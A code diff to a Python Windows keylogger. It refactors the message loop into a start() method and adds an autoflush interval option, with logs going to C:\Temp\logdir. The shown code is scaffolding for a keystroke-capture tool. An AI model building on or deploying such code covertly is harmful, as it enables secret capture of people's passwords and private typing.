@@ -22,8 +22,10 @@ class KeyLogger:
         #    self.hm.HookMouse()
         
         self.lw = LogWriter(self.options) 
-        
+
+    def start(self):
         pythoncom.PumpMessages()
+
 
     def OnKeyboardEvent(self, event):
         '''This function is the stuff that's supposed to happen when a key is pressed.
@@ -57,6 +59,10 @@ class KeyLogger:
 
         parser.add_option("-s", "--systemlog", action="store", dest="systemLog", help="log all output, plus some debug output, to a SYSTEMLOG file (inside DIRNAME, as specified with -f option). [default: %default]")
 
+        #parser.add_option("-r", "--raw", action="store", dest="raw", help="log events in raw mode (pickle event objects with all their attributes). [default: %default]")
+
+        parser.add_option("-i", "--interval", action="store", dest="interval", type="float", help="specify the time interval between buffer autoflush events, in seconds. [default: %default]")
+
         parser.set_defaults(dirName=r"C:\Temp\logdir",
                             hookKeyboard=True,
                             addLineFeed=False,
@@ -67,12 +73,14 @@ class KeyLogger:
                             debug=False,
                             noLog=None,
                             oneFile=None,
+                            interval=120.0,
                             systemLog=None)
 
         (self.options, args) = parser.parse_args()
                     
 if __name__ == '__main__':
     kl = KeyLogger()
+    kl.start()
     
     #if you want to change keylogger behavior from defaults, run it with commandline options. try '-h' for list of options.
     
